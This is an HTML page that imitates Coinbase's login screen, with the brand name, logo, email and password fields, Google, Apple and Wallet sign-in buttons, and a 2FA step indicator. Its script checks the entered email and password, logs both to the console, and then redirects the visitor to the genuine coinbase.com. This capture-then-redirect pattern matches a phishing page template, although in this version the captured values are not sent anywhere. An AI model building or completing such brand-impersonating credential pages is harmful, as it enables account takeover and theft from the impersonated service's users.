<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coinbase - Login</title>
    <link rel="icon" href="favicon.ico">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #0A0B0D;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            position: relative;
            color: #d1d1d1;
        }

        .login-container {
            background-color: #0A0B0D;
            padding: 40px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            border: 1px solid #24252A;
            border-radius: 16px;
            width: 450px;
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        .login-container h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #ffffff;
            font-weight: bold;
            text-align: left;
            margin-left: 10px;
        }

        label {
            font-size: 12px;
            color: white;
            font-weight: bold;
            text-align: left;
            margin-left: 10px;
            margin-bottom: 5px;
            display: block;
        }

        input[type="email"] {
            width: 90%;
            padding: 14px;
            margin: 10px 0;
            background-color: #0A0B0D;
            border: 1px solid #24252A;
            border-radius: 4px;
            font-size: 14px;
            display: block;
            margin-left: auto;
            margin-right: auto;
            color: white;
        }

        input[type="password"] {
            width: 90%;
            padding: 14px;
            margin: 10px 0;
            background-color: #0A0B0D;
            border: 1px solid #24252A;
            border-radius: 4px;
            font-size: 14px;
            display: block;
            margin-left: auto;
            margin-right: auto;
            color: white;
        }

        input:focus {
            outline: none;
            border-color: #578BFA;
            box-shadow: 0 0 0 3px rgba(86, 139, 250, 0.15);
        }

        .black-button {
            width: 100%;
            padding: 14px;
            background-color: #578BFA;
            color: #000000;
            border: none;
            border-radius: 16px;
            font-size: 15px;
            cursor: pointer;
            margin-top: 10px;
            text-align: center;
            font-weight: bold;
        }

        .black-button:hover {
            background-color: #578BFA;
        }

        .line-separator {
            margin: 20px 0;
            font-size: 14px;
            color: #fff;
            position: relative;
        }

        .line-separator span {
            margin: 0 10px;
            position: relative;
            z-index: 1;
        }

        .line-separator::before, .line-separator::after {
            content: "_______________";
            color: #fff;
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
        }

        .line-separator::before {
            left: 0;
        }

        .line-separator::after {
            right: 0;
        }

        .action-buttons {
            margin-top: 20px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .action-buttons button {
            width: 100%;
            padding: 16px;
            background-color: #32353D;
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 15px;
            cursor: pointer;
            text-align: left;
            padding-left: 20px;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .action-buttons button:hover {
            background-color: #2C2E32;
        }

        .action-buttons button img {
            width: 20px;
            margin-left: 10px;
            height: auto;
        }

        .info-text {
            margin-top: 10px;
            font-size: 12px;
            color: #A8A8A8;
        }

        .info-text a {
            color: #A8A8A8;
            text-decoration: none;
            border-bottom: 1px solid #A8A8A8;
        }

        .info-text a:hover {
            text-decoration: underline;
        }

        .logo {
            position: absolute;
            top: 20px;
            left: 20px;
            width: 40px;
            height: auto;
        }

        .signup-link {
            position: absolute;
            top: 20px;
            right: 20px;
            font-size: 14px;
            color: white;
            font-weight: bold;
            text-decoration: none;
        }

        .signup-link:hover {
            text-decoration: none;
        }

        .step-indicator {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 20px 0;
        }

        .step {
            width: 8px;
            height: 8px;
            background-color: #42445A;
            border-radius: 50%;
            position: relative;
            cursor: default;
        }

        .step.active {
            background-color: #578BFA;
        }

        .step-indicator-text {
            position: absolute;
            top: -25px;
            font-size: 12px;
            color: #fff;
        }

        .first-step-text {
            left: 0;
        }

        .second-step-text {
            left: 50%;
            transform: translateX(-50%);
        }

        .third-step-text {
            right: 0;
        }
    </style>
</head>
<body>
    <img src="coinbase-logo.png" alt="Coinbase Logo" class="logo">
    <a href="#" class="signup-link">Sign Up</a>

    <div class="login-container">
        <h1>Sign in to Coinbase</h1>
        <div class="step-indicator">
            <div class="step active"></div>
            <div class="step"></div>
        </div>
        <div class="step-indicator-text">
            <span class="first-step-text">Email</span>
            <span class="second-step-text">Password</span>
            <span class="third-step-text">2FA</span>
        </div>

        <form id="loginForm">
            <label for="email">Your Email Address</label>
            <input type="email" id="emailInput" placeholder="Your Email Address" required>

            <label for="password">Password</label>
            <input type="password" id="passwordInput" placeholder="Password" required>

            <button type="button" class="black-button">Continue</button>
        </form>

        <div class="line-separator">
            <span>OR</span>
        </div>

        <div class="action-buttons">
            <button>
                <span>Sign in with Google</span>
                <img src="google-icon.png" alt="Google Logo">
            </button>
            <button>
                <span>Sign in with Apple</span>
                <img src="apple-icon.png" alt="Apple Logo">
            </button>
            <button>
                <span>Sign in with Coinbase Wallet</span>
                <img src="wallet-icon.png" alt="Wallet Logo">
            </button>
        </div>

        <div class="info-text">
            <p>This device isn't yours? Use a private window. See our<br>
            <a href="#">Privacy Policy</a> for more information.</p>
        </div>
    </div>

    <script>
        const emailInput = document.getElementById('emailInput');
        const passwordInput = document.getElementById('passwordInput');
        const continueButton = document.querySelector('.black-button');
        const steps = document.querySelectorAll('.step');
        const stepTexts = document.querySelectorAll('.step-indicator-text span');

        continueButton.addEventListener('click', () => {
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();

            if (!email) {
                alert('Please enter your email address.');
                return;
            }

            if (!password) {
                alert('Please enter your password.');
                return;
            }

            // Email validation using regex
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                alert('Please enter a valid email address.');
                return;
            }

            // Password validation (minimum 8 characters)
            if (password.length < 8) {
                alert('Password must be at least 8 characters.');
                return;
            }

            console.log('Email submitted:', email);
            console.log('Password submitted:', password);

            // Redirect to Coinbase after successful validation
            window.location.href = 'https://www.coinbase.com';
        });

        // Add focus styles to password input
        passwordInput.addEventListener('focus', function() {
            this.parentElement.style.outline = '1px solid #578BFA';
        });

        passwordInput.addEventListener('blur', function() {
            this.parentElement.style.outline = 'none';
        });
    </script>
</body>
</html>
